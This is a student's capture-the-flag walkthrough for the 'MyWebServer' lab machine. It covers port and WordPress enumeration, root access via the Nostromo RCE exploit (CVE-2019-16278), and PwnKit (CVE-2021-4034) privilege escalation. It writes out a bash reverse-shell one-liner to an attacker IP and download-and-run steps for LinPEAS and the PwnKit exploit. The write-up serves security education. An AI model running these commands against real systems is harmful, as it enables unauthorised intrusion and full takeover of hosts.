<p align="center">
  <img src="https://capsule-render.vercel.app/render?type=wave&color=auto&height=200&section=header&text=Vadim%20Krohmal&fontSize=90" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Focus-Offensive_Security-red?style=for-the-badge&logo=kali-linux" />
  <img src="https://img.shields.io/badge/Status-Student_@_Karazin_Uni-blue?style=for-the-badge" />
</p>
# 🚩 CTF Walkthrough: MyWebServer (Medium)

Detailed penetration testing report for the **My Web Server** machine. This walkthrough covers comprehensive enumeration, web exploitation, and initial access vectors.

---

## 🔍 Phase 1: Enumeration

### 1.1 Host Discovery

The first step involved identifying the target machine's IP address within the local network.

```bash
# Identifying active hosts
nmap -sn 192.168.0.1/24

```

> **Target IP:** `192.168.0.102` (Verified via Oracle VirtualBox MAC address).

### 1.2 Service Scanning

A full TCP port scan was conducted to determine service versions and discover potential entry points.

```bash
# Full port scan with default scripts and version detection
nmap -p- -sC -sV 192.168.0.102

```

| Port | Service | Version | Observations |
| --- | --- | --- | --- |
| **22** | SSH | OpenSSH 7.9p1 | Standard remote access. |
| **80** | HTTP | Apache 2.4.38 | `robots.txt` contains `/wp-admin/`. |
| **2222** | HTTP | **Nostromo 1.9.6** | Rare server. Potential RCE candidate. |
| **3306** | MySQL | MySQL | Database service. |
| **8009** | AJP13 | Apache Jserv | Connector for Tomcat. Likely Ghostcat target. |
| **8080** | HTTP | Tomcat 8.0.33 | Web management panel. |
| **8081** | HTTP | Nginx 1.14.2 | Likely hosting a static site. |

---

## ⚡ Phase 2: Vulnerability Analysis

Following the scan analysis, high-priority attack vectors were identified:

1. **Port 2222 (Nostromo 1.9.6):**
* **Vulnerability:** **CVE-2019-16278** (Directory Traversal leading to RCE).
* **Priority:** 🔥 **Critical**. Direct path to a Reverse Shell.


2. **Port 8009 (AJP13):**
* **Vulnerability:** Suspected **Ghostcat (CVE-2020-1938)**.
* **Priority:** High. Allows arbitrary file reading (e.g., `WEB-INF/web.xml`).


3. **Port 80 (WordPress / armour.local):**
* **Action:** Requires mapping `armour.local` to the target IP in `/etc/hosts` for proper rendering.



---

## 🌐 Phase 3: Web Enumeration (Port 80)

### 3.1 WordPress Scanning

An aggressive scan was performed on the WordPress instance to uncover hidden details.

```bash
wpscan --url http://www.armour.local/ \
       --enumerate vp,vt,u \
       --plugins-detection aggressive \
       --random-user-agent \
       --ignore-main-redirect

```

**Key Findings:**

* **WP Version:** 5.3.2 (Outdated).
* **Theme:** `rife-free` v2.4.7.
* **Directory Listing:** Enabled on `/wp-content/uploads/` (Information Disclosure).
* **User Found:** Successfully enumerated username: `ap20dsero039`.

### 3.2 Result Analysis

While WPScan confirmed the site uses outdated components, no immediate critical plugin exploits were found. However, the discovery of the username `ap20dsero039` is a vital pivot point for:

* Password brute-forcing.
* SSH login attempts (checking for credential reuse).
* Targeting specific user directories during later exploitation.

> [!TIP]
> At this stage, WordPress brute-forcing was deferred. The primary focus shifted to **Nostromo (Port 2222)** due to the high probability of immediate code execution.

---

## 🚀 Phase 3: Exploitation (Port 2222)

### Vulnerability Research
Based on the initial scan, the **Nostromo 1.9.6** web server was flagged as a high-priority target. Using `searchsploit`, I looked for publicly available exploits.

```bash
searchsploit nostromo 1.9.6

Exploit Identified:

    Title: nostromo 1.9.6 - Remote Code Execution

    Path: multiple/remote/47837.py

    CVE: CVE-2019-16278

Preparing the Exploit

I mirrored the exploit to my local working directory for analysis and execution:
Bash

searchsploit -m multiple/remote/47837.py

The script targets a path traversal vulnerability in the nhttpd server, allowing for unauthenticated Remote Code Execution (RCE) by sending specially crafted HTTP requests.
### Executing the Exploit
After verifying the script requirements (Python 2), I tested the Remote Code Execution (RCE) by executing the `id` command.

```bash
python2 47837.py 192.168.0.102 2222 id

Response:
Plaintext

uid=1(daemon) gid=1(daemon) groups=1(daemon),0(root)

Establishing a Reverse Shell

To gain a more stable and interactive environment, I initiated a reverse shell.

    Setting up the listener:
    On my local machine (Kali), I started a netcat listener on port 4444:
    Bash

    nc -lvnp 4444


2. **Triggering the shell:**
   Using a bash reverse shell payload from `revshells.com`, I executed the following via the exploit:
   ```bash
   python2 47837.py 192.168.0.102 2222 "bash -c 'bash -i >& /dev/tcp/192.168.0.183/4444 0>&1'"
   

Success:
I received a connection back and obtained a shell as the daemon user.
Bash

Connection received on 192.168.0.102 37108
daemon@webserver:/usr/bin$
## 🛡️ Phase 4: Privilege Escalation

### System Enumeration
After gaining a foothold, I performed local enumeration to find a path to root. Since manual enumeration didn't immediately reveal unique misconfigurations or flags, I opted for an automated script to speed up the process.

1. **Transferring LinPEAS:**
   On my local machine, I hosted the script using a Python HTTP server:
   ```bash
   python3 -m http.server 8000
   

On the target machine, I downloaded it to the /tmp directory (the only writable partition):
Bash

cd /tmp
wget [http://192.168.0.183:8000/linpeas.sh](http://192.168.0.183:8000/linpeas.sh)
chmod +x linpeas.sh
./linpeas.sh

Identifying Vulnerabilities

The LinPEAS output highlighted several critical kernel and service vulnerabilities. The most promising was PwnKit (CVE-2021-4034), a local privilege escalation vulnerability in Polkit's pkexec.

Vulnerability Details:

    CVE: 2021-4034 (PwnKit)

    Exposure: Highly Probable

    Target: Sudo version 1.8.27 / Polkit

Exploitation (Path to Root)

I decided to use the PwnKit exploit due to its reliability and high success rate on Debian-based systems.

    Download and Extract:
    Bash

wget [https://codeload.github.com/berdav/CVE-2021-4034/zip/main](https://codeload.github.com/berdav/CVE-2021-4034/zip/main) -O pwnkit.zip
unzip pwnkit.zip
cd CVE-2021-4034-main

Execution:
I used the provided shell script wrapper which automates the compilation and execution process.
Bash

    chmod +x cve-2021-4034.sh
    ./cve-2021-4034.sh

Final Result:
Bash

# id
uid=0(root) gid=0(root) groups=0(root)
## 🏁 Conclusion
The compromise of the **My Web Server** machine was achieved through:
1. **Initial Access:** Exploiting an RCE vulnerability in the legacy Nostromo 1.9.6 web server (CVE-2019-16278).
2. **Privilege Escalation:** Utilizing the PwnKit (CVE-2021-4034) vulnerability to escalate from the `daemon` user to `root`.

This lab demonstrates the danger of running outdated web services and the critical importance of patching core system utilities like Polkit.
